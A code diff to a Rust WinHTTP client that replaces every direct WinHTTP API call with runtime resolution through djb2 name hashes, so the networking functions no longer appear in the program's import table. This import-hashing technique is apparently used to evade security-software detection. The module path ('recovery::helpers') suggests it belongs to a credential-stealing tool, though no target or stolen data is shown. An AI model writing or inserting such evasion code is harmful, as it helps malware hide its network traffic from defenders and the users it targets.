@@ -1,14 +1,15 @@
 use std::ffi::c_void;
-use std::ptr::null_mut;
+use std::ptr::{null, null_mut};
 use std::time::Duration;
 use serde::{Serialize, de::DeserializeOwned};
-use windows::core::{PCWSTR, HSTRING, Error as WinError};
-use windows::Win32::Networking::WinHttp::*;
+use crate::dynamic_invoke;
+use crate::recovery::helpers::dynamic_api::{djb2_hash, WINHTTP_HASH};
+use windows_sys::Win32::Foundation::GetLastError;
 
 #[derive(Debug, thiserror::Error)]
 pub enum Error {
     #[error("WinHttp error: {0}")]
-    WinHttp(#[from] WinError),
+    WinHttp(u32),
     #[error("IO error: {0}")]
     Io(#[from] std::io::Error),
     #[error("JSON error: {0}")]
@@ -16,6 +17,7 @@ pub enum Error {
     #[error("UTF8 error: {0}")]
     Utf8(#[from] std::string::FromUtf8Error),
     #[error("Status code: {0}")]
+    #[allow(dead_code)]
     Status(u32),
     #[error("Url parse error")]
     UrlParse,
@@ -153,6 +155,7 @@ impl RequestBuilder {
         self
     }
 
+    #[allow(dead_code)]
     pub fn json<T: Serialize>(mut self, json: &T) -> Self {
         if let Ok(body) = serde_json::to_vec(json) {
             self.body = body;
@@ -276,6 +279,18 @@ impl Part {
     }
 }
 
+const WINHTTP_ACCESS_TYPE_NO_PROXY: u32 = 1;
+const WINHTTP_ACCESS_TYPE_NAMED_PROXY: u32 = 3;
+const WINHTTP_ADDREQ_FLAG_ADD: u32 = 0x20000000;
+const WINHTTP_ADDREQ_FLAG_REPLACE: u32 = 0x80000000;
+const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
+const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
+const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;
+
+fn to_utf16(s: &str) -> Vec<u16> {
+    s.encode_utf16().chain(std::iter::once(0)).collect()
+}
+
 // Low-level WinHTTP Wrapper
 fn send_request_sync(
     client: Client,
@@ -284,10 +299,6 @@ fn send_request_sync(
     headers: std::collections::HashMap<String, String>,
     body: Vec<u8>,
 ) -> Result<Response, Error> {
-    fn winhttp_error() -> Error {
-        WinError::from_win32().into()
-    }
-
     unsafe {
         let url_parts = url_str.splitn(4, '/').collect::<Vec<&str>>(); 
         
@@ -304,38 +315,65 @@ fn send_request_sync(
         };
 
         let (host, port) = if let Some(idx) = host_port.find(':') {
-            (&host_port[..idx], host_port[idx+1..].parse::<u16>().unwrap_or(if scheme == "https:" { 443 } else { 80 }))
+            (
+                &host_port[..idx], 
+                host_port[idx+1..].parse::<u16>().unwrap_or(if scheme == "https:" { 443 } else { 80 })
+            )
         } else {
             (host_port, if scheme == "https:" { 443 } else { 80 })
         };
         
-        let user_agent = HSTRING::from(&client.user_agent);
-        let proxy_type = if client.proxy.is_some() { WINHTTP_ACCESS_TYPE_NAMED_PROXY } else { WINHTTP_ACCESS_TYPE_DEFAULT_PROXY };
-        let proxy_name = client.proxy.as_ref().map(|s| HSTRING::from(s)).unwrap_or_default();
-        let proxy_bypass = HSTRING::new();
+        let h_user_agent = to_utf16(&client.user_agent);
+        let proxy_type = if client.proxy.is_some() { WINHTTP_ACCESS_TYPE_NAMED_PROXY } else { WINHTTP_ACCESS_TYPE_NO_PROXY };
+        let proxy_name = client.proxy.as_ref().map(|s| to_utf16(s)).unwrap_or_default();
 
-        let h_session = WinHttpOpen(
-            PCWSTR::from_raw(user_agent.as_ptr()),
+        type FnWinHttpOpen = unsafe extern "system" fn(
+            psz_user_agent: *const u16,
+            dw_access_type: u32,
+            psz_proxy_w: *const u16,
+            psz_proxy_bypass_w: *const u16,
+            dw_flags: u32,
+        ) -> *mut c_void;
+
+        let h_session = dynamic_invoke!(
+            WINHTTP_HASH,
+            djb2_hash("WinHttpOpen"),
+            FnWinHttpOpen,
+            h_user_agent.as_ptr(),
             proxy_type,
-            if client.proxy.is_some() { PCWSTR::from_raw(proxy_name.as_ptr()) } else { PCWSTR::null() },
-            if client.proxy.is_some() { PCWSTR::from_raw(proxy_bypass.as_ptr()) } else { PCWSTR::null() },
-            0,
-        );
+            if client.proxy.is_some() { proxy_name.as_ptr() } else { null() },
+            null(),
+            0
+        ).unwrap_or(null_mut());
 
         if h_session.is_null() {
-            return Err(winhttp_error());
+            return Err(Error::WinHttp(GetLastError()));
         }
 
-        let h_connect = WinHttpConnect(
+        type FnWinHttpConnect = unsafe extern "system" fn(
+            h_session: *const c_void,
+            pswz_server_name: *const u16,
+            n_server_port: u16,
+            dw_reserved: u32,
+        ) -> *mut c_void;
+
+        let h_host = to_utf16(host);
+        let h_connect = dynamic_invoke!(
+            WINHTTP_HASH,
+            djb2_hash("WinHttpConnect"),
+            FnWinHttpConnect,
             h_session,
-            PCWSTR::from_raw(HSTRING::from(host).as_ptr()),
+            h_host.as_ptr(),
             port,
-            0,
-        );
+            0
+        ).unwrap_or(null_mut());
+
+        type FnWinHttpCloseHandle = unsafe extern "system" fn(h_internet: *const c_void) -> i32;
 
         if h_connect.is_null() {
-            let _ = WinHttpCloseHandle(h_session);
-            return Err(winhttp_error());
+            let err = GetLastError();
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
+            return Err(Error::WinHttp(err));
         }
 
         let method_str = match method {
@@ -343,81 +381,149 @@ fn send_request_sync(
             Method::Post => "POST",
         };
 
-        let flags = if scheme == "https:" { WINHTTP_FLAG_SECURE } else { WINHTTP_OPEN_REQUEST_FLAGS(0) };
+        let flags = if scheme == "https:" { WINHTTP_FLAG_SECURE } else { 0 };
 
-        let h_request = WinHttpOpenRequest(
+        type FnWinHttpOpenRequest = unsafe extern "system" fn(
+            h_connect: *const c_void,
+            pwsz_verb: *const u16,
+            pwsz_object_name: *const u16,
+            pwsz_version: *const u16,
+            pwsz_referrer: *const u16,
+            ppwsz_accept_types: *const *const u16,
+            dw_flags: u32,
+        ) -> *mut c_void;
+
+        let h_method = to_utf16(method_str);
+        let h_path = to_utf16(&path);
+
+        let h_request = dynamic_invoke!(
+            WINHTTP_HASH,
+            djb2_hash("WinHttpOpenRequest"),
+            FnWinHttpOpenRequest,
             h_connect,
-            PCWSTR::from_raw(HSTRING::from(method_str).as_ptr()),
-            PCWSTR::from_raw(HSTRING::from(path).as_ptr()),
-            PCWSTR::null(),
-            PCWSTR::null(),
-            std::ptr::null(),
-            flags,
-        );
+            h_method.as_ptr(),
+            h_path.as_ptr(),
+            null(),
+            null(),
+            null(),
+            flags
+        ).unwrap_or(null_mut());
 
         if h_request.is_null() {
-            let _ = WinHttpCloseHandle(h_connect);
-            let _ = WinHttpCloseHandle(h_session);
-            return Err(winhttp_error());
+            let err = GetLastError();
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
+            return Err(Error::WinHttp(err));
         }
+
+        type FnWinHttpAddRequestHeaders = unsafe extern "system" fn(
+            h_request: *const c_void,
+            pwsz_headers: *const u16,
+            dw_headers_length: u32,
+            dw_modifiers: u32,
+        ) -> i32;
 
         // Add Headers
         for (k, v) in headers {
             let header_str = format!("{}: {}", k, v);
-            let h_header = HSTRING::from(header_str);
-            let _ = WinHttpAddRequestHeaders(
+            let h_header = to_utf16(&header_str);
+            let _ = dynamic_invoke!(
+                WINHTTP_HASH,
+                djb2_hash("WinHttpAddRequestHeaders"),
+                FnWinHttpAddRequestHeaders,
                 h_request,
-                h_header.as_wide(),
-                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE,
+                h_header.as_ptr(),
+                u32::MAX, // Autodetect length
+                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
             );
         }
+
+        type FnWinHttpSendRequest = unsafe extern "system" fn(
+            h_request: *const c_void,
+            pwsz_headers: *const u16,
+            dw_headers_length: u32,
+            lp_optional: *const c_void,
+            dw_optional_length: u32,
+            dw_total_length: u32,
+            dw_context: usize,
+        ) -> i32;
 
         // Send Request
         let total_bytes = body.len() as u32;
         let p_data = if total_bytes > 0 {
-            Some(body.as_ptr() as *const c_void)
+            body.as_ptr() as *const c_void
         } else {
-            None
+            null()
         };
 
-        if let Err(err) = WinHttpSendRequest(
+        let success = dynamic_invoke!(
+            WINHTTP_HASH,
+            djb2_hash("WinHttpSendRequest"),
+            FnWinHttpSendRequest,
             h_request,
-            None,
+            null(),
+            0,
             p_data,
             total_bytes,
             total_bytes,
-            0,
-        ) {
-            let _ = WinHttpCloseHandle(h_request);
-            let _ = WinHttpCloseHandle(h_connect);
-            let _ = WinHttpCloseHandle(h_session);
+            0
+        ).unwrap_or(0);
+
+        if success == 0 {
+            let err = GetLastError();
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_request);
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
             return Err(Error::WinHttp(err));
         }
 
-        if let Err(err) = WinHttpReceiveResponse(h_request, null_mut()) {
-            let _ = WinHttpCloseHandle(h_request);
-            let _ = WinHttpCloseHandle(h_connect);
-            let _ = WinHttpCloseHandle(h_session);
+        type FnWinHttpReceiveResponse = unsafe extern "system" fn(h_request: *const c_void, lp_reserved: *const c_void) -> i32;
+
+        if dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpReceiveResponse"), FnWinHttpReceiveResponse, h_request, null_mut()).unwrap_or(0) == 0 {
+            let err = GetLastError();
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_request);
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
+            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
             return Err(Error::WinHttp(err));
         }
+
+        type FnWinHttpQueryHeaders = unsafe extern "system" fn(
+            h_request: *const c_void,
+            dw_info_level: u32,
+            pwsz_name: *const u16,
+            lp_buffer: *mut c_void,
+            lpdw_buffer_length: *mut u32,
+            lpdw_index: *mut u32,
+        ) -> i32;
 
         // Get Status Code
         let mut status_code: u32 = 0;
         let mut size = std::mem::size_of::<u32>() as u32;
-        let _ = WinHttpQueryHeaders(
+        let _ = dynamic_invoke!(
+            WINHTTP_HASH,
+            djb2_hash("WinHttpQueryHeaders"),
+            FnWinHttpQueryHeaders,
             h_request,
             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-            PCWSTR::null(),
-            Some(&mut status_code as *mut _ as *mut c_void),
+            null(),
+            &mut status_code as *mut _ as *mut c_void,
             &mut size,
-            null_mut(),
+            null_mut()
         );
+
+        type FnWinHttpQueryDataAvailable = unsafe extern "system" fn(h_request: *const c_void, lpdw_number_of_bytes_available: *mut u32) -> i32;
+        type FnWinHttpReadData = unsafe extern "system" fn(
+            h_request: *const c_void,
+            lp_buffer: *mut c_void,
+            dw_number_of_bytes_to_read: u32,
+            lpdw_number_of_bytes_read: *mut u32,
+        ) -> i32;
 
         // Read Body
         let mut response_body = Vec::new();
         loop {
             let mut dw_size: u32 = 0;
-            if WinHttpQueryDataAvailable(h_request, &mut dw_size).is_err() {
+            if dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpQueryDataAvailable"), FnWinHttpQueryDataAvailable, h_request, &mut dw_size).unwrap_or(0) == 0 {
                 break;
             }
             if dw_size == 0 {
@@ -426,12 +532,15 @@ fn send_request_sync(
 
             let mut buffer = vec![0u8; dw_size as usize];
             let mut downloaded: u32 = 0;
-            if WinHttpReadData(
+            if dynamic_invoke!(
+                WINHTTP_HASH,
+                djb2_hash("WinHttpReadData"),
+                FnWinHttpReadData,
                 h_request,
                 buffer.as_mut_ptr() as *mut c_void,
                 dw_size,
-                &mut downloaded,
-            ).is_ok() {
+                &mut downloaded
+            ).unwrap_or(0) != 0 {
                 buffer.truncate(downloaded as usize);
                 response_body.extend(buffer);
             } else {
@@ -439,9 +548,9 @@ fn send_request_sync(
             }
         }
 
-        let _ = WinHttpCloseHandle(h_request);
-        let _ = WinHttpCloseHandle(h_connect);
-        let _ = WinHttpCloseHandle(h_session);
+        dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_request);
+        dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
+        dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
 
         Ok(Response {
             status: status_code,
